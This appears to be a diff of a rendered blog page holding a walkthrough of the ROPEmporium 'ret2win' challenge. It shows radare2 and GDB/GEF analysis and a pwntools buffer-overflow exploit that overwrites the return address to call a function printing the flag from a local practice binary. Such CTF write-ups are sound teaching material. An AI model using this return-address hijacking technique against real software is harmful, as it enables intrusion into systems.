@@ -206,6 +206,16 @@ if (!doNotTrack) {
     </a>
   </li>
 
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://thieunguyen5991.github.io/projects">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-product-hunt"></i>
+      
+      <span class="sidebar-button-desc">Projects</span>
+    </a>
+  </li>
+
 
     </ul>
     <ul class="sidebar-buttons">
@@ -217,16 +227,6 @@ if (!doNotTrack) {
       <i class="sidebar-button-icon fa fa-lg fa-github"></i>
       
       <span class="sidebar-button-desc">GitHub</span>
-    </a>
-  </li>
-
-  <li class="sidebar-button">
-    
-      <a class="sidebar-button-link " href="https://twitter.com/thieunguyen5991" target="_blank" rel="noopener">
-    
-      <i class="sidebar-button-icon fa fa-lg fa-twitter"></i>
-      
-      <span class="sidebar-button-desc">Twitter</span>
     </a>
   </li>
 
@@ -320,33 +320,42 @@ if (!doNotTrack) {
           
           <div class="post-content markdown" itemprop="articleBody">
             <div class="main-content-wrap">
-              <p>So i had an idea for a long time, that i really should document the commands and programs that i use for pwning especially ROP based exploits. But since i lately ran through the ROPEmporium Challenges i thought, might as well make it a series on the blog. Now i assume that you as a reader already have some experience in creating buffer overflow exploits where you jump to the stack and execute shellcode.</p>
+              
+
+<p>So i had an idea for a long time, that i really should document the commands and programs that i use for pwning especially ROP based exploits. But since i lately ran through the ROPEmporium Challenges i thought, might as well make it a series on the blog. Now i assume that you as a reader already have some experience in creating buffer overflow exploits where you jump to the stack and execute shellcode.</p>
+
 <h2 id="what-is-return-oriented-programming-rop">What is Return Oriented Programming (ROP)?</h2>
+
 <blockquote>
 <p><strong>Return-oriented programming</strong> ( <strong>ROP</strong> ) is a <a href="https://en.wikipedia.org/wiki/Computer_security_exploit">computer security exploit</a> technique that allows an attacker to execute code in the presence of security defenses such as <a href="https://en.wikipedia.org/wiki/Executable_space_protection">executable space protection</a> and <a href="https://en.wikipedia.org/wiki/Code_signing">code signing</a>.</p>
-</blockquote>
-<blockquote>
-<p>In this technique, an attacker gains control of the <a href="https://en.wikipedia.org/wiki/Call_stack">call stack</a> to hijack program <a href="https://en.wikipedia.org/wiki/Control_flow">control flow</a> and then executes carefully chosen <a href="https://en.wikipedia.org/wiki/Machine_instruction">machine instruction</a> sequences that are already present in the machine&rsquo;s memory, called &ldquo;gadgets&rdquo;<br>
+
+<p>In this technique, an attacker gains control of the <a href="https://en.wikipedia.org/wiki/Call_stack">call stack</a> to hijack program <a href="https://en.wikipedia.org/wiki/Control_flow">control flow</a> and then executes carefully chosen <a href="https://en.wikipedia.org/wiki/Machine_instruction">machine instruction</a> sequences that are already present in the machine&rsquo;s memory, called &ldquo;gadgets&rdquo;<br />
 Source: <a href="https://en.wikipedia.org/wiki/Return-oriented_programming">https://en.wikipedia.org/wiki/Return-oriented_programming</a></p>
 </blockquote>
+
 <h2 id="setup">Setup</h2>
+
 <p>First of all the setup that I&rsquo;ll be using might not be what you have, either way here&rsquo;s the list that I&rsquo;m going to be working with:</p>
+
 <ul>
 <li>IDE: Atom</li>
 <li>Python2.7 with pwntools</li>
 <li>radare2 disassembler</li>
 <li>GDB with GDB Enhanced Features (GEF)</li>
 </ul>
+
 <p>So first of all lets start with downloading the binary that we are supposed to exploit</p>
 <pre><code>root@linux:~/ret2win# wget https://ropemporium.com/binary/ret2win.zip
 root@linux:~/ret2win# unzip ret2win.zip
 root@linux:~/ret2win# ls
-flag.txt ret2win ret2win.zip
-</code></pre><p>So that&rsquo;s done, Lets start by analyzing the ret2win binary</p>
+flag.txt ret2win ret2win.zip</code></pre>
+<p>So that&rsquo;s done, Lets start by analyzing the ret2win binary</p>
 <pre><code>root@linux:~/ret2win# file ret2win
-ret2win: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a871295b6234edb261710bcc73a8c03e3c0f601d, not stripped
-</code></pre><p>So two things stand out, <em>ELF 64-bit</em> and <em>not stripped.</em> Now we should already anticipated the ELK 64-bit since we downloaded the 64-bit version of ret2win, the <em>not stripped</em> though means that we have the symbols available to us. which will make reversing the binary a bit easier.</p>
+ret2win: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a871295b6234edb261710bcc73a8c03e3c0f601d, not stripped</code></pre>
+<p>So two things stand out, <em>ELF 64-bit</em> and <em>not stripped.</em> Now we should already anticipated the ELK 64-bit since we downloaded the 64-bit version of ret2win, the <em>not stripped</em> though means that we have the symbols available to us. which will make reversing the binary a bit easier.</p>
+
 <h2 id="radare2-reversing">Radare2 Reversing</h2>
+
 <p>In the challenge description, they stated that there was a function in the binary called <em>ret2win,</em> which basically means &ldquo;return here to win(print the flag)&rdquo;. Before we dive into radare2 its good practice to look what security the binary has been compiled with.</p>
 <pre><code>root@Valkyrie:~/Documents/courses/ropemporium/0-ret2win# rabin2 -I ret2win
 arch x86
@@ -379,8 +388,9 @@ sanitiz false
 static false
 stripped false
 subsys linux
-va true
-</code></pre><p>Just to confirm that the <em>nx</em> bit is true, which means that we cannot place executable shellcode on the stack and that points to a ROP based exploit. Now lets fire up radare2 in order to analyze the assembly and symbols looking for that ret2win function.</p>
+va true</code></pre>
+<p>Just to confirm that the <em>nx</em> bit is true, which means that we cannot place executable shellcode on the stack and that points to a ROP based exploit. Now lets fire up radare2 in order to analyze the assembly and symbols looking for that ret2win function.</p>
+
 
 
  
@@ -408,7 +418,9 @@ va true
   
 </div>
 
+
 <p>The two command are <code>fs symbols</code> in order to select the symbols space to list all flags, and <code>f | grep ret2win</code> So that we can search the symbols for the address to ret2win function. Analyzing the function ret2win we can see that it calls the string &ldquo;/bin/cat flag.txt&rdquo; using system, that will print us the flag.</p>
+
 
 
  
@@ -436,7 +448,9 @@ va true
   
 </div>
 
+
 <h2 id="going-for-the-pwn">Going for the pwn!</h2>
+
 <p>Now lets start by looking at creating the exploit itself, pwntools comes with an awesome function where you can easily create a template, or stubcode for CTF-exploits.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">root<span style="color:#a6e22e">@Valkyrie</span>:<span style="color:#f92672">~/</span>Documents<span style="color:#f92672">/</span>courses<span style="color:#f92672">/</span>ropemporium<span style="color:#f92672">/</span><span style="color:#ae81ff">0</span><span style="color:#f92672">-</span>ret2win<span style="color:#75715e"># pwn template --host 127.0.0.1 --port 31337 ret2win --quiet</span>
 <span style="color:#75715e">#!/usr/bin/env python2</span>
@@ -478,18 +492,22 @@ gdbscript <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;
 
 io <span style="color:#f92672">=</span> start()
 
-io<span style="color:#f92672">.</span>interactive()
-</code></pre></div><p>When calling the python code with the following arguments</p>
-<ul>
-<li>LOCAL - Exploit the local binary</li>
-<li>DEBUG - Exploit with Debug input/output</li>
-<li>GDB - Run the exploit together with a GDB session attached</li>
-</ul>
+io<span style="color:#f92672">.</span>interactive()</code></pre></div>
+<p>When calling the python code with the following arguments<br />
+- LOCAL - Exploit the local binary<br />
+- DEBUG - Exploit with Debug input/output<br />
+- GDB - Run the exploit together with a GDB session attached</p>
+
 <p>Running the exploit without any arguments simply try to exploit the IP and port stated, but since ROPEmporium is only local binaries we wont bother trying something remote.</p>
+
 <p>This will ensure some reproducibility every time we change something in the exploit code and exploit the service.</p>
+
 <h3 id="rip">RIP</h3>
-<p>Now because this is a 64-bit program contrary to a 32-bit where we  want to control the EIP register, this time controlling RIP is the key to inject out own code.</p>
+
+<p>Now because this is a 64-bit program contrary to a 32-bit where we &nbsp;want to control the EIP register, this time controlling RIP is the key to inject out own code.</p>
+
 <p>In order to determine the amount of junk to overwrite the RIP, we have to open it up in GDB and create a unique pattern.</p>
+
 
 
  
@@ -517,7 +535,9 @@ io<span style="color:#f92672">.</span>interactive()
   
 </div>
 
+
 <p>Now run the program and when you are required to input data, paste the unique string, which if the string is long enough, will crash the execution of the binary.</p>
+
 
 
  
@@ -545,7 +565,9 @@ io<span style="color:#f92672">.</span>interactive()
   
 </div>
 
+
 <p>The important register is the stack pointer <em>$rsp.</em> Now still GDB and doing a pattern search for the string in <em>$rsp</em> GEF will display the offset at which we control the register.</p>
+
 
 
  
@@ -573,6 +595,7 @@ io<span style="color:#f92672">.</span>interactive()
   
 </div>
 
+
 <p>The other notable thing from the GDB output is that we are required to input data after &ldquo;&gt; &ldquo;. Both of these two pieces of data will be used in the exploit.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># -- Exploit goes here --</span>
 junk <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">40</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;BBBBBBBB&#39;</span> <span style="color:#75715e">#junk with the offset in order to overwrite RIP</span>
@@ -582,8 +605,9 @@ payload <span style="color:#f92672">=</span> junk <span style="color:#75715e">#P
 io <span style="color:#f92672">=</span> start()
 io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;&gt; &#39;</span>) <span style="color:#75715e">#pwn function &#34;Recieve data until symbol&#34;</span>
 io<span style="color:#f92672">.</span>sendline(payload) <span style="color:#75715e">#send object ending with a carriage return</span>
-io<span style="color:#f92672">.</span>interactive()
-</code></pre></div><p>This code will consistently crash the ret2win binary and running it with <code>./exploit.py LOCAL GDB</code> will attach a GDB session showing that $RSP is overwritten with <em>8*B.</em></p>
+io<span style="color:#f92672">.</span>interactive()</code></pre></div>
+<p>This code will consistently crash the ret2win binary and running it with <code>./exploit.py LOCAL GDB</code> will attach a GDB session showing that $RSP is overwritten with <em>8*B.</em></p>
+
 
 
  
@@ -611,9 +635,12 @@ io<span style="color:#f92672">.</span>interactive()
   
 </div>
 
+
 <h3 id="ret2win">Ret2Win</h3>
+
 <p>Having the program crash is all fun and games, but we want that flag!</p>
-<p>now since ROP is exploiting using library or binary &ldquo;gadgets&rdquo; we have to replace those <em>8*B</em> with a valid address to a function. Since we got that hint to use the ret2win (0x00400811) function  from ROPEmporium, lets do that.</p>
+
+<p>now since ROP is exploiting using library or binary &ldquo;gadgets&rdquo; we have to replace those <em>8*B</em> with a valid address to a function. Since we got that hint to use the ret2win (0x00400811) function &nbsp;from ROPEmporium, lets do that.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># -- Exploit goes here --</span>
 junk <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">40</span> <span style="color:#75715e">#junk with the offset in order to overwrite RIP</span>
 ret2win <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400811</span>) <span style="color:#75715e">#gadget which executes /bin/cat flag.txt</span>
@@ -624,8 +651,9 @@ payload <span style="color:#f92672">+=</span> ret2win
 io <span style="color:#f92672">=</span> start()
 io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;&gt; &#39;</span>) <span style="color:#75715e">#pwn function &#34;Recieve data until symbol&#34;</span>
 io<span style="color:#f92672">.</span>sendline(payload) <span style="color:#75715e">#send object ending with a carriage return</span>
-io<span style="color:#f92672">.</span>interactive()
-</code></pre></div><p>Running the exploit locally again results in a flag being printed to us!</p>
+io<span style="color:#f92672">.</span>interactive()</code></pre></div>
+<p>Running the exploit locally again results in a flag being printed to us!</p>
+
 
 
  
@@ -653,7 +681,9 @@ io<span style="color:#f92672">.</span>interactive()
   
 </div>
 
-<h3 id="but-wait-theres-more">But wait&hellip; There&rsquo;s more!!!</h3>
+
+<h3 id="but-wait-there-s-more">But wait&hellip; There&rsquo;s more!!!</h3>
+
 <p>Yeah we got the flag. but to do something cool with pwntools since we are already using the python lib. Since the binary was not stripped (important), and pwntools automatically loads the binary into its context. Pwntools also loads the symbols, and their corresponding addresses which we can call in the exploit script. in other words we don&rsquo;t have to mess about with static addresses but can call the ret2win using pwntools symbols.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#Blog: https://blog.securitybits.io/2019/08/08/ropemporium-0-ret2win/</span>
 <span style="color:#75715e">#!/usr/bin/env python2</span>
@@ -703,8 +733,8 @@ io <span style="color:#f92672">=</span> start()
 io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;&gt; &#39;</span>)
 io<span style="color:#f92672">.</span>sendline(payload)
 io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;:&#39;</span>)
-log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#39;Flag: &#39;</span> <span style="color:#f92672">+</span> io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>))
-</code></pre></div><p>Github-Repo: <a href="https://github.com/Securitybits-io/ROPEmporium">https://github.com/Securitybits-io/ROPEmporium</a></p>
+log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#39;Flag: &#39;</span> <span style="color:#f92672">+</span> io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>))</code></pre></div>
+<p>Github-Repo: <a href="https://github.com/Securitybits-io/ROPEmporium">https://github.com/Securitybits-io/ROPEmporium</a></p>
 
               
             </div>
